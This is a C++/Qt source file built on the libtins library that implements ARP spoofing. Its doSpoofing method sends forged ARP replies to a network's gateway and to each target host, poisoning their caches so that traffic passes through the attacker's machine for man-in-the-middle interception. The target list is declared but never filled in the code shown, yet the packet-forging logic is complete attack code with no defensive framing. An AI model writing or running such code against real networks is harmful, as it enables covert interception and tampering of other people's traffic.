#include "ArpSpoofing.h"
#include <QDebug>
#include <QThread>
#include <QEventLoop>

ArpSpoofing::ArpSpoofing(QObject *parent) : QObject(parent)
{

}

void ArpSpoofing::doSpoofing()
{
    using namespace Tins;

    NetworkInterface::Info nifinfo = m_interface.info();

    PacketSender sender;

    EthernetII::address_type gateway_hw = Utils::resolve_hwaddr(m_interface, m_gatewayIp, sender);

    std::vector<IPv4Address> iplist;

    // foreach device on network
    foreach(IPv4Address target_ip, iplist)
    {
        EthernetII::address_type target_hw = Utils::resolve_hwaddr(m_interface, target_ip, sender);

        // Gateway ---------------------------------------------------------

        // Logicial layer
        ARP gw_arp(m_gatewayIp, target_ip, gateway_hw, nifinfo.hw_addr);
        gw_arp.opcode(ARP::REPLY);

        // Physical layer
        EthernetII to_gw = EthernetII(gateway_hw, nifinfo.hw_addr) / gw_arp;

        sender.send(to_gw, m_interface);

        // Target ---------------------------------------------------------

        // Logicial layer
        ARP tg_arp(target_ip, m_gatewayIp, target_hw, nifinfo.hw_addr);
        tg_arp.opcode(ARP::REPLY);

        // Physical layer
        EthernetII to_tg = EthernetII(target_hw, nifinfo.hw_addr) / tg_arp;

        sender.send(to_tg, m_interface);
    }
}

Tins::IPv4Address ArpSpoofing::gatewayIp() const
{
    return m_gatewayIp;
}

void ArpSpoofing::setGatewayIp(const Tins::IPv4Address &gateway_ip)
{
    m_gatewayIp = gateway_ip;
}

Tins::NetworkInterface ArpSpoofing::interface() const
{
    return m_interface;
}

void ArpSpoofing::setInterface(const Tins::NetworkInterface &interface)
{
    m_interface = interface;
}
